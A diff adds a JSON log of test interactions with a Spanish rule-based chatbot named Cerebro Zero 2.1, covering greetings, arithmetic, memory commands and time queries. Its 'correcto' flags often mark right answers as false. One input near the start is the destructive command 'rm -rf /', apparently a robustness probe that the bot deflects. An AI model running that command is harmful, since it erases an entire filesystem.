@@ -1,0 +1,4802 @@
+{
+  "experiencias": [
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.726534"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.742648"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.747921"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 10 * 7?",
+      "salida": "10.0 * 7.0 = 70.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.750136"
+    },
+    {
+      "entrada": "recuerda color = azul",
+      "salida": "\u2705 Guardado: color = azul",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.760737"
+    },
+    {
+      "entrada": "recordar color",
+      "salida": "\ud83d\udcad Recuerdo: color = azul",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.761685"
+    },
+    {
+      "entrada": "recuerda nombre = Manuel",
+      "salida": "\u2705 Guardado: nombre = Manuel",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.767529"
+    },
+    {
+      "entrada": "recordar nombre",
+      "salida": "\ud83d\udcad Recuerdo: nombre = Manuel",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.771339"
+    },
+    {
+      "entrada": "aprende a programar en python",
+      "salida": "\ud83c\udf93 Aprendido: a programar en python",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.779361"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:48",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.784367"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:48",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.786050"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.788394"
+    },
+    {
+      "entrada": "qu\u00e9 es la ia",
+      "salida": "\u2753 No recuerdo 'la'",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.791547"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.794099"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:48.798180"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.089191"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 2 + 3?",
+      "salida": "2.0 + 3.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.168281"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 - 4?",
+      "salida": "5.0 - 4.0 = 1.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.169584"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 3 * 3?",
+      "salida": "3.0 * 3.0 = 9.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.170396"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 10 / 2?",
+      "salida": "10.0 / 2.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.171170"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 1 + 1?",
+      "salida": "1.0 + 1.0 = 2.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.172046"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 7 + 3?",
+      "salida": "7.0 + 3.0 = 10.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.172896"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 8 - 2?",
+      "salida": "8.0 - 2.0 = 6.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.173783"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 4 * 4?",
+      "salida": "4.0 * 4.0 = 16.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.174900"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 2 + 3?",
+      "salida": "2.0 + 3.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.176053"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 - 4?",
+      "salida": "5.0 - 4.0 = 1.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.177130"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 3 * 3?",
+      "salida": "3.0 * 3.0 = 9.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.178180"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 10 / 2?",
+      "salida": "10.0 / 2.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.179224"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 1 + 1?",
+      "salida": "1.0 + 1.0 = 2.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.180385"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 7 + 3?",
+      "salida": "7.0 + 3.0 = 10.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.181497"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 8 - 2?",
+      "salida": "8.0 - 2.0 = 6.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.182579"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 4 * 4?",
+      "salida": "4.0 * 4.0 = 16.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.183732"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 2 + 3?",
+      "salida": "2.0 + 3.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.184930"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 - 4?",
+      "salida": "5.0 - 4.0 = 1.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.186148"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 3 * 3?",
+      "salida": "3.0 * 3.0 = 9.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.187349"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 10 / 2?",
+      "salida": "10.0 / 2.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.188667"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 1 + 1?",
+      "salida": "1.0 + 1.0 = 2.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.189962"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 7 + 3?",
+      "salida": "7.0 + 3.0 = 10.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.191295"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 8 - 2?",
+      "salida": "8.0 - 2.0 = 6.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.193040"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 4 * 4?",
+      "salida": "4.0 * 4.0 = 16.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.194543"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 2 + 3?",
+      "salida": "2.0 + 3.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.196046"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 - 4?",
+      "salida": "5.0 - 4.0 = 1.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.197482"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 3 * 3?",
+      "salida": "3.0 * 3.0 = 9.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.198934"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 10 / 2?",
+      "salida": "10.0 / 2.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.200427"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 1 + 1?",
+      "salida": "1.0 + 1.0 = 2.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.201869"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 7 + 3?",
+      "salida": "7.0 + 3.0 = 10.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.203311"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 71 * 16?",
+      "salida": "71.0 * 16.0 = 1136.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.204932"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 91 - 8?",
+      "salida": "91.0 - 8.0 = 83.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.206463"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 94 + 12?",
+      "salida": "94.0 + 12.0 = 106.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.208421"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 43 - 4?",
+      "salida": "43.0 - 4.0 = 39.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.210318"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 72 - 3?",
+      "salida": "72.0 - 3.0 = 69.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.212386"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 57 + 3?",
+      "salida": "57.0 + 3.0 = 60.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.214187"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 52 - 13?",
+      "salida": "52.0 - 13.0 = 39.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.216483"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 41 + 13?",
+      "salida": "41.0 + 13.0 = 54.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.218232"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 68 * 11?",
+      "salida": "68.0 * 11.0 = 748.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.220021"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 81 - 16?",
+      "salida": "81.0 - 16.0 = 65.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.221784"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 70 * 13?",
+      "salida": "70.0 * 13.0 = 910.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.223563"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 83 + 4?",
+      "salida": "83.0 + 4.0 = 87.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.225710"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 70 + 8?",
+      "salida": "70.0 + 8.0 = 78.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.227694"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 92 - 8?",
+      "salida": "92.0 - 8.0 = 84.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.229642"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 23 - 15?",
+      "salida": "23.0 - 15.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.231548"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 28 * 3?",
+      "salida": "28.0 * 3.0 = 84.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.233537"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 79 + 8?",
+      "salida": "79.0 + 8.0 = 87.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.235465"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 27 * 16?",
+      "salida": "27.0 * 16.0 = 432.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.237450"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 97 - 18?",
+      "salida": "97.0 - 18.0 = 79.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.239381"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 23 - 3?",
+      "salida": "23.0 - 3.0 = 20.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.241664"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 25 - 11?",
+      "salida": "25.0 - 11.0 = 14.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.243895"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 82 - 19?",
+      "salida": "82.0 - 19.0 = 63.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.245989"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 63 - 3?",
+      "salida": "63.0 - 3.0 = 60.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.248157"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 81 - 5?",
+      "salida": "81.0 - 5.0 = 76.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.250301"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 67 - 16?",
+      "salida": "67.0 - 16.0 = 51.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.252450"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 81 + 9?",
+      "salida": "81.0 + 9.0 = 90.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.254589"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 99 - 14?",
+      "salida": "99.0 - 14.0 = 85.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.256835"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 72 + 14?",
+      "salida": "72.0 + 14.0 = 86.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.259354"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 48 + 16?",
+      "salida": "48.0 + 16.0 = 64.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.261784"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 84 + 8?",
+      "salida": "84.0 + 8.0 = 92.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.264179"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 0 + 0?",
+      "salida": "0.0 + 0.0 = 0.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.266565"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 0 * 9999?",
+      "salida": "0.0 * 9999.0 = 0.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.268955"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es -5 + 10?",
+      "salida": "-5.0 + 10.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.271313"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 100 - 200?",
+      "salida": "100.0 - 200.0 = -100.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.273718"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 99 * 0?",
+      "salida": "99.0 * 0.0 = 0.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.276644"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.279933"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.282757"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.285525"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.288123"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.290708"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.293626"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.296461"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.299140"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.301830"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.304580"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.307302"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.310364"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.313229"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.316041"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.318810"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.322033"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.325433"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.328480"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.331365"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.334283"
+    },
+    {
+      "entrada": "qu\u00e9 tal",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.337303"
+    },
+    {
+      "entrada": "hey",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.340305"
+    },
+    {
+      "entrada": "saludos",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.343639"
+    },
+    {
+      "entrada": "buenas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.346721"
+    },
+    {
+      "entrada": "qu\u00e9 pasa",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.350395"
+    },
+    {
+      "entrada": "qu\u00e9 tal",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.353509"
+    },
+    {
+      "entrada": "hey",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.356599"
+    },
+    {
+      "entrada": "saludos",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.360077"
+    },
+    {
+      "entrada": "buenas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.363258"
+    },
+    {
+      "entrada": "qu\u00e9 pasa",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.366464"
+    },
+    {
+      "entrada": "qu\u00e9 tal",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.369985"
+    },
+    {
+      "entrada": "hey",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.373389"
+    },
+    {
+      "entrada": "saludos",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.377062"
+    },
+    {
+      "entrada": "buenas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.380481"
+    },
+    {
+      "entrada": "qu\u00e9 pasa",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.383833"
+    },
+    {
+      "entrada": "qu\u00e9 tal",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.387226"
+    },
+    {
+      "entrada": "hey",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.390649"
+    },
+    {
+      "entrada": "saludos",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.394389"
+    },
+    {
+      "entrada": "buenas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.397912"
+    },
+    {
+      "entrada": "qu\u00e9 pasa",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.401414"
+    },
+    {
+      "entrada": "hola adi\u00f3s hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.404978"
+    },
+    {
+      "entrada": "no hola",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.409987"
+    },
+    {
+      "entrada": "\u00bfhola?",
+      "salida": "hola \u2192 Hola, \u00bfqu\u00e9 tal?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.414377"
+    },
+    {
+      "entrada": "HOLA MUNDO",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.418162"
+    },
+    {
+      "entrada": "h o l a",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.422218"
+    },
+    {
+      "entrada": "recuerda mem_known_0 = value_0",
+      "salida": "\u2705 Guardado: mem_known_0 = value_0",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.429700"
+    },
+    {
+      "entrada": "recuerda mem_known_1 = value_1",
+      "salida": "\u2705 Guardado: mem_known_1 = value_1",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.436830"
+    },
+    {
+      "entrada": "recuerda mem_known_2 = value_2",
+      "salida": "\u2705 Guardado: mem_known_2 = value_2",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.444333"
+    },
+    {
+      "entrada": "recuerda mem_known_3 = value_3",
+      "salida": "\u2705 Guardado: mem_known_3 = value_3",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.451681"
+    },
+    {
+      "entrada": "recuerda mem_known_4 = value_4",
+      "salida": "\u2705 Guardado: mem_known_4 = value_4",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.459249"
+    },
+    {
+      "entrada": "recuerda mem_known_5 = value_5",
+      "salida": "\u2705 Guardado: mem_known_5 = value_5",
+      "correcto": true,
